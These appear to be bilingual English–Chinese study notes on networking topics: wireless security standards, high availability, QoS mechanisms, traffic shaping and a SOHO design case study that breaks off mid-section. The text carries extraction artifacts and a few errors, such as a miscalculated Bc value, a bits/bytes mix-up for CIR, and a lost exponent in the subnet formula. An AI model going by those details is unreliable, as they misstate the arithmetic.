  - EAP-FAST - EAP-Flexible Authentication via Secure
Tunneling
  - EAP-TLS - EAP-Transport Layer Security
  - PEAP-GTC - Protected EAP–Generic Token Card
  - PEAP-MSCHAPv2 - Protected EAP–Microsoft Challenge
Hand- shake Authentication Protocol version 2
 authentication mechanisms (EAP methods)
can be used with EAP.
 (highest level of
security)
  - relies on client-side and server-side
certificates to perform authentication
   - PEAP - Protected Extensible Authentication Protocol   - encapsulates EAP
  - designed to work within TLS (Transport Layer Security) tunnel that may be encrypted but is authenticated.
  - The primary motivation:
  - to help correct the deficiencies discovered within
EAP
  - protocol assumes that the communications channel
are protected.
  - As a result, when EAP messages are able to be
discovered in the “clear” they do not provide the protection that was assumed when the protocol was originally authored.
  - PEAP, EAP-TTLS, EAP-TLS “protect” inner EAP authentication within SSL/TLS sessions.
  - Configure wireless network with EAP-TLS, require deploy certificate to endpoint devices. Security Standards
- When configuring a wireless client for security, the most common security standards from which you can select are as follows:
◦ WEP - Wired Equivalent Privacy
▸ Original 802.11 standard did address security by WEP key.
▸ With WEP, an AP is configured with a static WEP key.
- Wireless clients needing to associate with an AP are configured with an
identical key (making this a PSK approach to security).
▸ The 802.11 standard: a 40-bit WEP key (weak security measure)
- Because a WEP key, static string of characters, could be compromised with a
brute-force attack (attempts all possible character combinations until find WEP key)
▸ Another concern, WEP uses RC4 as its encryption algorithm.
- RC4 - Ron’s/Rivest Cipher: (developed by Ron Rivest of RSA Security), also arc 4.
•
◦
RC4 uses a 24-bit initialization vector (IV)
a string of characters added to the transmitted data,
So same plain text data frame will never appear as the same WEP-encrypted data frame.
◦ However, the IV is transmitted in clear text.
▸ use packet-capture software, captures enough packets having the same WEP key,
▸ Having the IV in clear text
▸ Can use mathematical algorithm (like WEP-cracking software online) to determine the static WEP key.
▸ Some WEP implementations support the use of a longer WEP key (like 128 bits not 40 bits),
◦
•
- key.
◦
making a WEP key more difficult to crack;
however, both the wireless clients and their AP must support the longer WEP
WPA - Wi-Fi Protected Access (WPA).
▸ The Wi-Fi Alliance (a nonprofit organization: certify interoperability of wireless devices) developed its own security standard, WPA, to address the weaknesses of WEP.
▸ Some security enhancements:
- in enterprise mode: can require a user to be authenticated before keys are exchanged.
- In enterprise mode: the keys used between a wireless client and an access point are temporary session keys.
- WPA uses Temporal Key Integrity Protocol (TKIP) for enhanced encryption. ◦ Although TKIP does rely on an initialization vector, the IV is expanded from
WEP’s 24-bit IV to a 48-bit IV.
◦ Also, broadcast key rotation can be used, which causes a key to change so
quickly, an eavesdropper would not have time to exploit a derived key.
◦ TKIP leverages 影响 Message Integrity Check (MIC), which is sometimes
referred to as Message Integrity Code (MIC).
▸
- - - •
set - - •
802.11a, 802.11b, 802.11g, 802.11n,
multiple input, multiple output (MIMO),
channel bonding,
independent basic service set (IBSS), basic service set (BSS), extended service
(ESS),
warchalking,
service set identifier (SSID),
Wired Equivalent Privacy (WEP), Wi-Fi Protected Access (WPA), Wi-Fi
MIC can confirm that data was not modified in transit. WPA = WPA1= WPA version 1.
◦
◦
◦ WPA2
WPA2 = WPA version 2
▸ IEEE 802.11i standard (2004): required stronger algorithms for encryption and integrity checking than WLAN security protocols like WEP and WPA.
▸ The requirements set forth in the IEEE 802.11i standard are implemented in the Wi-Fi Alliance’s WPA version 2 (WPA2) security standard.
▸ WPA2 uses:
- Counter Mode with Cipher Block Chaining 锁链 Message Authentication Code Protocol (CCMP) for integrity checking.
- Advanced Encryption Standard (AES) for encryption.
Define Key Terms
- wireless access point (AP), wireless router,
- decibel (dB), omnidirectional antenna, unidirectional antenna,
- carrier sense multiple access collision avoidance (CSMA/ CA),
- direct-sequence spread spectrum (DSSS), frequency-hopping spread spectrum
(FHSS), Orthogonal Frequency Division Multiplexing (OFDM), Protected Access version 2 (WPA2) Optimizing Network Performance
Optimizing Network Performance 9
- If you saw the movie The Field of Dreams, you’ve heard this statement: “If you build it, they will come.” That statement has proven itself to be true in today’s networks. These networks, which were once relegated to the domain of data, can now carry voice and video. These additional media types, in addition to mission-critical data applications, need a network to be up and available for its users.
- example, think about how often your telephone service has been unavailable versus how often your data network has been unavailable. Unfortunately, data networks have traditionally been less reliable than voice networks; however, today’s data networks often are voice networks, contributing to this increased demand for uptime.
- Beyond basic availability, today’s networks need optimization tools to make the most of their available bandwidth. This book already addressed several network optimization tools, which are reviewed in this chapter.
- Quality of service (QoS) is an entire category of network-optimization tools.
◦ one example, can give priority treatment to latency-sensitive (delay- sensitive) traffic, such as Voice over IP (VoIP). This chapter devotes a section to exploring these tools.
Foundation Topics High Availability
- If a network switch or router stops operating correctly (a network fault occurs), communication through the network could be disrupted, resulting in a network becoming unavailable to its users.
- Therefore, network availability, called uptime, is a major design consideration. This consideration might, example, lead you to add fault-tolerant devices and fault-tolerant links between those devices.
- This section discusses the measurement of high availability along with a collection of high-availability design considerations.
High-Availability Measurement
- The availability of a network is measured by its uptime during a year. ◦ Example
▸ if a network has five nines of availability (99.999%), maximum 5 min downtime/year.
▸ If a network has six nines of availability (99.9999%), down less than 30 sec /year.
- As a designer, one of your goals is to select components, topologies, and features that maximize network availability within certain parameters (example, a budget).
- Be careful not to confuse availability with reliability.
◦ reliable network: does not drop many packets.
◦ available network: up and operational.
▸ the availability of a network increases:
- the mean time to repair (MTTR) of the network devices
decreases
- the mean time between failures (MTBF) increases.
◦ Therefore, selecting reliable networking devices that are quick to repair is crucial to a high-availability design.
Fault-Tolerant Network Design
- Two approaches to designing a fault-tolerant network:
◦ Single points of failure:
▸ If the failure of a single network device or link (like switch, router, or WAN connection) would result in a network becoming unavailable, that single device or link is a potential single point of failure. To eliminate single points of failure from your design, you might include :
•
•
redundant links and redundant hardware. ◦ Example:
▸ some high-end Ethernet switches support two power supplies
▸ if one power fails, the switch continues operate by using the backup power supply.
Port redundancy and link redundancy
◦ interconnecting network infrastructure components by
more than one physical link.
◦ even if a switch or router completely failed, the network would go down, a network with these
single points of failure can still offer redundancy.
◦ No single points of failure:
▸ without any single point of failure
▸ contains redundant network-infrastructure components (like
switches and routers).
▸ Additionally, these redundant devices are interconnected with
redundant links.
▸ Although a network host could have two network interface
cards (NIC),
- each of which connects to a different switch,
- such a design is rarely implemented because the increased
costs.
▸ Instead, a network with no single points of failure in the
backbone
- allows any single switch, router or single link in the
backbone to fail, while maintaining end-to-end
network connectivity.
- These two approaches can be used together to increase a network’s
availability even further.
Hardware Redundancy
- Having redundant route processors in a switch or router chassis 底架 improves the chassis’ reliability.
◦ example:
▸ a multilayer switch has two route processors中央处理器,
▸ one of the route processors could be active, with the other route processor standing by
▸ take over in the event the active processor became unavailable.
- An end system can have redundant NICs. The two modes of NIC redundancy are as follows:
◦ Active-active:
▸ Both NICs are active at the same time, and have their own MAC address.
▸ This makes troubleshooting more complex, while giving you slightly better performance than the Active-Standby approach.
◦ Active-standby: - allows the client to appear to have a single MAC address and IP address, even in the event of a NIC failure.
- NIC redundancy is most often found in strategic network hosts, rather than in end-user client computers, because of the expense and administrative overhead.
Layer 3 Redundancy
- End systems, not running a routing protocol, point to a default gateway.
- The default gateway: traditionally the IP address of a router on the local subnet.
◦ If the default gateway router fails, the end systems are unable to leave their subnet.
- introduced two first-hop redundancy technologies (which offer Layer 3 redundancy):
◦ Hot Standby Router Protocol (HSRP):
▸ A Cisco proprietary approach to first- hop redundancy.
▸ workstation A is configured with a default gateway (next-hop
▸ To •
•
- - •
gateway) of 172.16.1.3.
prevent the default gateway from becoming a single point
of failure,
HSRP enables routers R1 and R2 to each act as the default
gateway, although only one of the routers will act as
the default gateway at any one time.
Under normal conditions, router R1 (active router)
forwards packets sent to 172.16.1.3.
If router R1 is unavailable, router R2 (standby router) take over and start forwarding traffic sent to 172.16.1.3.
Notice that neither router R1 nor R2 have a physical interface with an IP address of 172.16.1.3.
Instead, a logical router (virtual router), which is serviced by either router R1 or R2, maintains the 172.16.1.3 IP address.
◦ Common Address Redundancy Protocol (CARP):
▸ CARP is an open-standard variant of HSRP.
- Each of these technologies, the MAC address and the IP address of a
default gateway can be serviced by more than one router (or
multilayer switch).
◦ Therefore, if a default gateway becomes unavailable, the other router (or multilayer switch) can take over, still servicing the
same MAC and IP addresses.
- Another type of Layer 3 redundancy: achieved by having multiple
links between devices and selecting a routing protocol that load
balances over the links.
- Link Aggregation Control Protocol (LACP), enables you to assign
multiple physical links to a logical interface, which appears as a single link to a route processor.
Design Considerations for High-Availability Networks
- When designing networks for high availability, answer the following questions:
◦ Where will module and chassis redundancy be used?
▸ Module redundancy provides redundancy within a chassis by:
- allowing one module to take over in the event that a primary module fails.
▸ Chassis redundancy provides redundancy by:
- having more than one chassis, thus providing a path from
the source to destination, even in the event of a chassis
or link failure.
◦ What software redundancy features are appropriate?
◦ What protocol characteristics affect design requirements?
◦ What redundancy features should be used to provide power to an
infrastructure device (like using an uninterruptible power
supply [UPS] or a generator)?
◦ What redundancy features should be used to maintain
environmental conditions (like dual air-conditioning units)?
High-Availability Best Practices
- The following steps are five best practices for designing high- availability networks:
◦ 1.Examine technical goal
◦ 2.Identify the budget to fund high-availability features.
◦ 3.Categorize business applications into profiles, each of which
require a certain level of availability.
◦ 4.Establish performance standards for high-availability
solutions.
◦ 5.Define how to manage and measure the high-availability
solution. - Although existing networks can be retrofitted to make them highly available networks, network designers can often reduce such
expenses by integrating 融入 high-availability best practices and technologies into the initial design of a network.
Content Caching (Chapter 3)
- A content engine: a network appliance, a network optimization
technology.
◦ can receive a copy of content stored elsewhere (like a video
presentation located on a server at corporate headquarters)
◦ serve that content to local clients,
◦ reducing the bandwidth burden on an IP WAN.
content switching / Load Balancing
- Another network optimization technology introduced in Chapter 3 was content switching,
◦ allows a request coming into a server farm to be distributed across multiple servers containing identical content.
◦ This approach to load balancing lightens the load on individual servers in a server farm and allows servers to be taken out of the farm for maintenance without disrupting access to the server farm’s data.
◦ Example: a sample content switching topology, which performs load balancing across five servers (containing identical content) in a server farm.
QoS Technologies
- Quality of service (QoS): a suite of technologies that allows you to strategically optimize network performance for select traffic types.
用于评估服务方满足客户服务需求的能力。
- 通过配置QoS，对企业的网络流量进行调控，避免并管理网络拥塞，减
    少报文的丢失率，同时也可以为企业用户提供专用带宽或者为不同
    的业务(语音、视频、数据等)提供差分服务。
◦ Example: today’s converged networks (networks simultaneously transporting voice, video, and data), some applications might be more intolerant of delay (latency) than other applications
◦ like an FTP file transfer is less latency sensitive than a Voice over IP [VoIP] call. - Fortunately, through the use of QoS technologies, you can:
◦ identify which traffic types need to be sent first,
◦ how much bandwidth to allocate to various traffic types,
◦ which traffic types should be dropped first in the event of
congestion
◦ how to make the most efficient use of the relatively limited
bandwidth of an IP WAN.
- This section introduces QoS and a collection QoS of mechanisms.
Introduction to QoS
- A lack of bandwidth is the overshadowing issue for most quality problems. Specifically, when there is a lack of bandwidth, packets might suffer from one or more issue.
- Three Categories of Quality Issues:
◦ Delay
▸ the time required for a packet to travel from its source to its destination.
▸ Example: delay on the evening news, when the news anchor is talking via satellite to a foreign news correspondent. Because of the satellite delay, the conversation begins to feel unnatural.
▸ 单个网络设备的时延包括传输时延、串行化时延、处理时延、 以及队列时延。
- •
•
•
传输时延:一个数据位从发送方到达接收方所需要的时
 间。该时延取决于传输距离和传输介质，与带宽无关。
串行化时延:指发送节点在传输链路上开始发送报文的第
 一个比特至发完该报文的最后一个比特所需的时间。该
 时延取决于链路带宽以及报文大小。
处理时延:指路由器把报文从入接口放到出接口队列需要
 的时间。它的大小跟路由器的处理性能有关。
队列时延:指报文在队列中等待的时间。它的大小跟队列
 中报文的大小和数量、带宽以及队列机制有关。
◦ Jitter 抖动
▸ Jitter is the uneven 不平滑的;不规则的 arrival of packets.
▸ Example: imagine a VoIP conversation
- packet 1 arrives at a destination router.
- Then, 20 ms later, packet 2 arrives. - After another 70 ms, packet 3 arrives,
- then packet 4 arrives 20 ms behind packet 3.
- This variation in arrival times (variable delay) is not
dropping packets, but this jitter might be interpreted by the listener as dropped packets.
▸ 某些业务类型(特别是语音和视频等实时业务)是极其不能容 忍抖动的。报文到达时间的差异将在语音或视频中造成断 续;
▸ 另外，抖动也会影响一些网络协议的处理，有些协议是按固定 的时间间隔发送交互性报文，抖动过大就会导致协议震荡，
▸ 而实际上所有传输系统都有抖动，但只要抖动在规定容差之内 就不会影响服务质量，另外，可利用缓存来克服过量的抖 动，但这将会增加时延。
◦ Drops 丢包(packetloss)
▸ occur when a link is congested and a router’s interface queue overflows. Some types of traffic, such as UDP traffic carrying voice packets, are not retransmitted if packets are dropped.
▸ 处理过程:路由器在收到报文的时候可能由于CPU繁忙，无法 处理报文而导致丢包;
▸ 排队过程:在把报文调度到队列的时候可能由于队列被装满而 导致丢包;
▸ 传输过程:报文在链路上传输的过程中，可能由于种种原因(如 链路故障)导致的丢包。
▸ 少量的丢包对业务的影响并不大，例如
- 在语音传输中，丢失一个比特或一个报文的信息，通话双
方往往注意不到;
- 在视频广播期间，丢失一个比特或一个报文可能造成屏幕
上瞬间的波形干扰，但视频很快就会恢复正常。
- 即使使用传输控制协议(TCP)传送数据也能处理少量的丢
        包，但大量的丢包就会严重影响到传输效率。
- Fortunately, QoS features available on many routers and switches can recognize important traffic and then treat that traffic in a special way.
◦ Example: you might want to allocate 128 kbps of bandwidth for your VoIP traffic and give that traffic priority treatment.
- When packet travels from source to destination, its effective
bandwidth is the bandwidth of the slowest link along that path.
- The primary challenge QoS is lack of bandwidth,
- How do we increase available bandwidth?
◦ Add more bandwidth: comes at a relatively high cost.
◦ use QoS features to give your mission-critical applications higher-
priority treatment in times of network congestion (like carpool lane during rush hour)
QoS Configuration Steps
- The mission statement of QoS:
◦ “To categorize traffic and apply a policy to those traffic categories,
in accordance with a QoS policy.”
- Understanding underlying purpose of QoS can better understand the
three basic steps to QoS configuration:
◦ 1. Determine network performance requirements for various traffic
▸
▸ ▸
▸
▸
types.
Like consider design recommendations for voice, video, and
data traffic:
Voice: No more than 150 ms of one-way delay; no more than
30 ms of jitter; and no more than 1 percent packet loss. Video: No more than 150 ms of one-way delay for interactive
voice applications (example, video conferencing); no more
than 30 ms of jitter; no more than 1 percent packet loss. Data: Applications have varying delay and loss requirements. Therefore, data applications should be categorized into
predefined classes of traffic, where
each class is configured with specific delay and loss
characteristics.
◦ 2. Categorize traffic into specific categories.
▸ Example:
- you might have a category named Low Delay, place voice
and video packets.
- You might also have a Low Priority class, place traffic such
as music downloads from the Internet.
◦ 3. Document your QoS policy and make it available to your users.
▸ Example, - if a user complains that his network-gaming applications are running slowly, you can point him to your corporate QoS policy,
- which describes how applications such as network gaming have best-effort treatment while VoIP traffic receives priority treatment.
- The actual implementation of these steps varies based on the specific device you are configuring.
◦ configure QoS on your routers and switches:
▸ command-line interface (CLI) ▸ graphical-user interface (GUI)
QoS Components QoS服务模型
- QoS features are categorized into one of the three categories:
◦ Best-effort: 尽力而为的服务模型的网络
▸ does not truly provide QoS to that traffic, because there is no reordering of packets.
▸ Best-effort uses a first-in, first-out (FIFO) queuing strategy,
- packets are emptied from a queue in the same order that
they entered the queue.
▸ 是一个单一的服务模型，也是最简单的服务模型。
▸ 应用程序可以在任何时候，发出任意数量的报文，而且不需要
事先获得批准，也不需要通知网络。
▸ 网络尽最大的可能性来发送报文，但对时延、可靠性等性能不
提供任何保证，但适用于绝大多数网络应用，如FTP、E-
Mail等。
▸ Best-Effort服务是现在Internet的缺省服务模型，它是通过先入
先出(FIFO)队列来实现的。
▸ 在尽力而为的服务模型下，提高端到端通信质量:
- 增大网络带宽:
◦ 增大单位时间内传输的数据量，按照FIFO在单位时间内
传输更多的数据，改善网络拥塞问题。 - 升级网络设备:
◦ 增大数据处理能力，按照FIFO在单位时间内能够处理更 多的数据，改善网络拥塞问题。
◦ Integrated Services (IntServ): 综合服务模型
▸ IntServ是一种最为复杂的服务模型，它需要用到RSVP - Resource Reservation Protocol (RSVP) is an example of an IntServ approach to QoS.
◦ 在应用程序发送报文前，需要向网络申请特定的带宽和 所需的特定服务质量的请
◦ 求，这个请求是通过信令(signal)来完成的，
◦ 应用程序首先通知网络它自己的流量参数和所需的特定
服务质量的请求，包括带宽、时延等。
◦ 应用程序一般在收到网络的确认信息后，即认为网络已
        经为这个应用程序的报文发送预留了资源，然后立
即发送报文.
▸ IntServ is often referred to as hard QoS, because it can make strict bandwidth reservations.
▸ IntServ uses signaling among network devices to provide bandwidth reservations.
▸ main drawback: lack of scalability.
- Because IntServ must be configured on every router along
a packet’s path.
- IntServ要求端到端网络的所有节点都支持RSVP协议，
- 且每个节点都需要周期性地同相邻节点交换状态信息，
- 这样会加大协议报文导致的开销。
- 所有网络节点都需要为每个数据流保存状态信息，而当前
在Internet⻣干网上有着成千上万条数据流，因此
IntServ模型在Internet⻣干网上无法得到广泛应用。
◦ Differentiated services 区分服务模型
▸ DiffServ, differentiates between multiple traffic flows. 业务流 分类和标记由边缘router来完成。
- 边界router可以通过多种条件(比如报文的源地址和目的地 址、ToS域中的优先级、协议类型等)灵活地对报文进 行分类，
- 然后对不同类型的报文设置不同的标记字段，
- 而其他router只需要简单地识别报文中的这些标记，然后对
其进行相应的资源分配和流量控制即可。
- 因此，DiffServ是一种基于报文流的QoS模型。
▸ Specifically, packets are marked, and routers and switches can then make decisions (Example, dropping or forwarding decisions) based on those markings.
▸ Because DiffServ does not make an explicit reservation, it is
often called soft QoS.
▸ Most modern QoS configurations are based on the DiffServ
approach. 充分考虑了IP网络本身所具有的灵活性、可扩展 性强等特点，将复杂的服务质量保证通过报文自身携带的信 息转换为单跳行为，从而大大减少了信令的工作。该模型是 目前应用最广的服务模型。
▸ 它只包含有限数量的服务等级，少量的状态信息来提供有差别 的流量控制和转发。
- DS节点:实现DiffServ功能的网络节点称为DS节点。
- DS边界节点:负责连接另一个DS域或者连接一个没有DS功
能的域的节点。DS边界节点负责将进入此DS域的业务
流进行分类和流量调整。
- DS内部节点:用于在同一个DS域中连接DS边界节点和其他
内部节点。DS内部节点仅需基于报文中的EXP、 802.1p、IPP等字段值进行简单的流分类以及对相应的流 进行流量控制。
- DS域(DSDomain):一组采用相同的服务提供策略和实 现了相同PHB(PerHop Behaviors)的相连DS节点组 成。一个DS域由相同管理部⻔的一个或多个网络组成， 如一个DS域可以是一个ISP，也可以是一个企业的内部 网络。
QoS Mechanisms 技巧
- As previously mentioned, a DiffServ approach to QoS marks traffic.
- However, for markings to impact the behavior of traffic, a QoS tool
must reference those markings and alter the packets’ treatment
based on them.
- The following is a collection of commonly used QoS mechanisms:
◦ Classification
◦ Marking
◦ Congestion management
◦ Congestion avoidance
◦ Policing and shaping ◦ Link efficiency
- The following sections describe each QoS mechanism in detail.
◦ Classification
▸ the process of placing traffic into different categories. ▸ Multiple characteristics can be used for classification.
- Example, POP3, IMAP, SMTP, and Exchange traffic could all be placed in an E-MAIL class.
▸ But, Classification does not alter any bits in the frame or packet.
◦ Marking
▸ alters bits in a frame/cell/packet to indicate how the network should treat that traffic.
▸ Marking alone does not change how the network treats a packet.
▸ Other tools (like queuing tools) can, reference and make decisions based on the markings.
▸ Various packet markings exist. - Example:
- inside an IPv4 header, there is a byte called the type of service (ToS) byte.
- You can mark packets, using bits within the ToS byte, using either IP Precedence or Differentiated Service Code Point (DSCP) markings
◦ IP Precedence:
▸ uses the 3 left-most bits in the ToS byte.
▸ With 3 bits, markings range from 0–7.
▸ But, 6 and 7 should not be used, because those
values are reserved for network use.
◦ DSCP: Differentiated Service Code Point
▸ More granularity
▸ uses the 6 left-most bits in the ToS byte. ▸ 6 bits yield 64 possible values (0–63).
◦ Congestion Management
▸ When a device (like switch/router), receives traffic faster than it can be transmitted, the device attempts to buffer/store the extra traffic until bandwidth becomes available. management.
▸ However, queuing algorithms (like weighted fair queuing [WFQ], low latency queuing [LLQ], weighted round robin [WRR]) can be configured on routers and switches.
- These algorithms divide an interface’s buffer into multiple logical
▸ The queuing algorithm then empties packets from those logical queues in a sequence and amount determined by the algorithm’s configuration.
•
Example: traffic could first be sent from a priority queue (which might contain VoIP packets) up to a certain bandwidth limit, after which packets could be sent from a different queue.
◦ Congestion Avoidance
▸ If an interface’s output queue fills to capacity, newly arriving packets are discarded/tail dropped.
▸ To prevent this, use a congestion-avoidance technique random early detection (RED):
- - •
After a queue depth reaches configurable level (minimum threshold ), RED introduces the possibility of a packet discard.
As the queue depth continues increase, the possibility of discard increases, until configurable maximum threshold is reached.
After the queue depth exceeds the maximum threshold for traffic with a specific priority, there is a 100 percent chance of discard for those traffic types.
▸ If discarded packets are TCP-based (connection-oriented),
- the sender knows which packets are discarded, can
retransmit
- those dropped packets.
▸ if dropped packets are UDP-based (connectionless)
- the sender does not receive any indication that the packets
were dropped.
◦ 限速技术: Policing 管制 and Shaping 整形
▸ Instead of limit bandwidth available for specific traffic types, you might want to limit available bandwidth, by using:
▸ traffic conditioners: Both policing and traffic-shaping tools can accomplish this objective. ▸ Policing: 限速
- can be used in either the inbound or outbound direction,
- typically discards packets that exceed the configured rate
limit, which you can think of as a speed limit for
specific traffic types.
◦ Because policing drops packets, resulting in
retransmissions
◦ recommended for higher-speed interfaces.
◦ 主要是用于isp和企业网的边界处，isp对于进入的流量 进行QOS重新标记和速率限制，支持双向。
▸ Shaping: 整形
- Shaping buffers (delays) traffic exceeding a configured
rate.
- Therefore, shaping is recommended for slower-speed
interfaces.
- 主要是针对于企业site之间，用于星星网络结构中中心site 与多分支site速率不匹配的时候进行流量整形使site之间 的速率一致。只支持output方向。
▸ 管制是重在管理流量的速度和标记，而整形是重在通过放慢传 输数据量达到两端传输速率一致
▸ Traffic shaping (and policing) can limit the speed of packets exiting a router
▸ How can we send traffic at a rate that is less than the physical clock rate of the interface
- shaping and policing tools do not transmit all the time.
- they send a certain number of bits/bytes at line rate, and
then they stop sending,
- until a specific timing interval (example, 1/8th of a
second) is reached.
- After the timing interval is reached, the interface again
sends a specific amount of traffic at line rate.
- It stops and waits for the next timing interval to occur.
- This process continually repeats,
- allowing an interface to send an average bandwidth that
might be below the physical speed of the interface. ▸ committed information rate (CIR). 承诺速率:
- The average bandwidth, 指流量每秒的速率。
- CIR = Bc / Tc. Tc = Bc / CIR. - BC=CIR*TC=CIR/8，cir=800,则bc应=1000
▸ Committed Burst (Bc): 突发流量的大小
- The number of bits (the unit of measure used with
shaping tools) or bytes (the unit of measure used with policing tools) that are sent during a timing interval.
▸ Be: exceed burst, 超出的流量
▸ Tc: time interval 时间间隔,
- 1/8s = 1/8th of a second = 125 ms (eight timing intervals
in a second)
- BC单位是bit, CIR单位是Byte,所以为了转换TC被设置1/8s
- if you want a smaller timing interval, configure a smaller
Bc.
▸ PIC: 最大速率
▸ Violate: 违规的流量，be桶也容不下的流量
▸ Example:
▸ a physical line rate of 128 kbps(128,000bps), CIR is only 64
kbps(64,000bps). assume Tc = 1/8th ▸ of a second = 125 ms.
▸ during each of those timing intervals, 8,000 bits (the committed burst parameter) are sent at line rate. Therefore:
- - •
•
Cir=Bc/Tc
Bc=Cir*Tc=64,000*1/8=8000 bits
Every second, 8,000 bits were sent (at line rate) eight
times, for a grand total of 64,000 bits per second (CIR) The shaping of traffic to 64 kbps on a line with a rate of
128 kbps.
▸ If all the Bc bits (or bytes) were not sent during a timing
•
interval, there is an option to bank those bits and use them during a future timing interval. The parameter that allows this storing of unused potential bandwidth is called the Excess Burst (Be) parameter.
The Be parameter in a shaping configuration specifies the maximum number of bits or bytes that can be sent in excess of the Bc during a timing interval, if those bits are indeed available. For those bits or bytes to be available, they must have gone unused during previous timing intervals.
▸ Policing tools, however, use the Be parameter to specify the maximum number of bytes that can be sent during a •
timing interval.
Therefore, in a policing configuration,
◦ if the Bc equals the Be, no excess bursting occurs.
◦ If excess bursting occurs, policing tools consider this
excess traffic as exceeding traffic.
◦ Traffic that conforms to (not exceed) a specified CIR is
conforming traffic.
◦ Link Efficiency
▸ To make the most of the limited bandwidth available on slower-speed links, you might choose to implement compression or link fragmentation and interleaving (LFI) 链 路分片与交叉.
▸ compression: you could compress a packet’s payload or header to conserve bandwidth,
▸ Example: header compression.
- VoIP packets, the Layer 3 and Layer 4 headers total 40
bytes in size.
- depending on how you encode voice, the voice payload
might be only 20 bytes in size.
- So VoIP benefits most from header compression, as
opposed to payload compression.
- VoIP sends packets using:
- Real-Time Transport Protocol (RTP), Layer 4 protocol.
(IP+UDP+RTP)
◦ RTP is then encapsulated inside UDP (another Layer 4 protocol), which is then encapsulated inside of IP (at Layer 3).
- RTP header compression (cRTP)
◦ take the Layer 3 and Layer 4 headers and compress them to only 2 or 4 bytes in size
◦ 2 bytes if UDP checksums are not used, 4 bytes if UDP checksums are used.
▸ link fragmentation and interleaving (LFI) 链路分片与交叉:
- addresses the issue of serialization delay (the amount of
time required for a packet to exit an interface) ▸ Example:
▸ A large data packet on a slower-speed link
▸ might create excessive delay for a voice packet (the time
required for the data packet to exit the interface)
▸ LFI fragments the large packets and interleaves插入纸 the smaller packets in among the fragments, reducing the
serialization delay experienced by the smaller packets. ▸ Figure 9-14: packets labeled D are data packets, packets
labeled V are voice packets. 网络时延的构成
- serialization delay: the amount of time required for a packet to exit an interface.
- Processing delay 处理时延- time routers take to process the packet header.
◦ 节点进行报文存储转发处理所产生的时间
- Queuing delay 排队时延 - time the packet spends in routing queues.
◦ 报文发送前在发送队列中排队的时间
◦ 数据报的到达速度 > 路由器的处理速度，就会将数据报暂存起来，
等待处理。
- Transmission delay 发送时延 - time it takes to push the packet's bits onto the link.
◦ 以一定的速率发送完一个一定⻓度报文所需的时间
- Propagation delay 传播时延 - time for a signal to reach its destination.
◦ 信号在传输通道上产生的时延
几个参数
路由器的传输速度(Transmission rate)，10Mbps / 100Mbps / 1000Mbps / 10Gbps。
路由器的服务速度(Service rate):Transmission rate / average packet size， 路由器每秒最多能处理的数据报个数。
数据报的到达速度(Arrival rate):每秒有多少个数据报到达路由器。 路由器利用率(Resource utilization):Arrival rate / Service rate，表示路由 器的使用情况。
T:路由器的传输速度。 S:路由器的服务速度。 A:数据报的到达速度。 U:路由器的利用率。 P:数据报的平均大小。 D:排队时延。
时延曲线(delay curve)可以用以下函数来表示:
Case Study: SOHO Network Design
Case Study Scenario
- While working through your design, consider the following:
◦ Meeting all requirements
◦ Media distance limitations
◦ Network device selection
◦ Environmental factors
◦ Compatibility通用性 with existing and future equipment
- The following are your design scenario and design criteria for this case
study:
◦ Company ABC leases two buildings (building A and building B) in
a large office park.
◦ The office park has a conduit 导水管 system that allows physical media to run between buildings. The distance (via the conduit system) between building A and building B is 1 km.
◦ Company ABC will use the Class B address of 172.16.0.0/16 for its sites.
▸ You should subnet this classful network
▸ to support not only the two buildings (one subnet per
building),
▸ but to allow as many as five total sites in the future, as
Company ABC continues to grow.
◦ Company ABC needs to connect to the Internet, supporting a
speed of at least 30 Mbps, and this connection should come
into building A.
◦ Cost is a primary design consideration, while performance is a
secondary design consideration.
◦ Each building contains various Wi-Fi client devices (smart phones,
tablets, and laptops).
▸ A: 200 hosts, Three floors, each of which can be services with a
single wireless access point ▸ B: 100 hosts, One floor, which can be serviced by a single wireless access point
◦ Your design should include the following information:
▸ Network address and subnet mask for building A ▸ Network address and subnet mask for building B ▸ Layer 1 media selection
▸ Layer 2 device selection
▸ Layer 3 device selection
▸ Wireless design
▸ Any design elements based on environmental considerations ▸ An explanation of where cost savings were created from
performance tradeoffs
▸ A topological diagram of the proposed design
◦ multiple designs could meet the design criteria, review the following suggested solution.
◦ reviewing the logic behind other designs can often give you a fresh perspective for future designs.
Suggested Solution
- This suggested solution begins by IP address allocation.
- Then, consideration is given to the Layer 1 media, followed by Layer 2
and Layer 3 devices. Wireless design decisions are presented.
- Design elements based on environmental factors are discussed.
- The suggested solution also addresses how cost savings were achieved
through performance tradeoffs.
- Finally, a topological diagram of the suggested solution is presented.
IP Addressing
- when designing the IP addressing of a network:
◦ How many hosts do you need to support (now and in the future)?
◦ How many subnets do you need to support (now and in the
future)?
- From the scenario, each subnet must accommodate at least 200 hosts,
at least five subnets.
◦ the subnet mask is based on the number of required subnets.
▸ Eight subnets: three borrowed bits, two borrowed only support four subnets
▸ Number of subnets = 2s, (s is the number of borrowed bits) - With three borrowed bits, we have 13 bits left for host IP addressing,
(far more than needed 200 host) ◦ three borrowed bits: subnet mask 255.255.224.0.
◦ the third octet is the last octet to contain a binary 1 in the subnet
mask, the third octet is the interesting octet.
◦ The block size = subtract the subnet decimal value of interesting
octet from 256: ▸ 256 - 224 = 32.
◦ Because the block size is 32, and the interesting octet is the third octet
◦ subnets are created with the 255.255.224.0/19 subnet mask: ▸ 172.16.0.0 /19
▸ 172.16.32.0 /19
▸ 172.16.64.0 /19
▸ 172.16.96.0 /19 ▸ 172.16.128.0 /19 ▸ 172.16.160.0 /19 ▸ 172.16.192.0 /19 ▸ 172.16.224.0 /19
◦ The first two subnets are selected for the building A and building B subnet.
Layer 1 Media
- when selecting the Layer 1 media types of a network:
◦ What speeds need to be supported (now and in the future)?
◦ What distances between devices need to be supported (now and in
the future)?
- Within each building, Category 6a (Cat 6a) unshielded-twisted pair
(UTP) cabling is selected to interconnect network components. The installation is based on Gigabit Ethernet. However, if 10-Gigabit Ethernet devices are installed in the future, Cat 6a is rated for 10GBASE-T for distances as long as 100 m.
- The 1-km distance between building A and building B is too far for UTP cabling. Therefore, multimode fiber (MMF) is selected. The speed of the fiber link will be 1 Gbps.
◦ Connection Type: Media Type
◦ LAN links within buildings: Cat 6a UTP
◦ Link between building A and building B: MMF
Layer 2 Devices
- when selecting Layer 2 devices in a network: ◦ ◦
◦ ◦
- A ◦
◦
Where will the switches be located?
What port densities are required on the switches (now and in the
future)?
What switch features need to be supported (example, STP or
LACP)?
What media types are used to connect to the switches?
collection of Ethernet switches interconnect network devices within each building.
Assuming the 200 hosts in building A are distributed relatively
